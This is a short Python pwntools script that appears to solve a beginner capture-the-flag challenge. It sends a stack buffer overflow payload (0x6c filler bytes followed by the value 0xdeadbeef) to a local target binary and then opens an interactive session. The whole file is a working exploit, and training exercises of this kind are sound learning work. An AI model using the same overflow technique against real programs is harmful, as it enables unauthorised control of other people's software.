#!/usr/bin/env python3
from pwn import *

p = process( '/challenges/01-basic/target')
e = ELF('./target')
payload = b"A"*0x6c + p32(0xdeadbeef)
p.send(payload)
p.interactive()
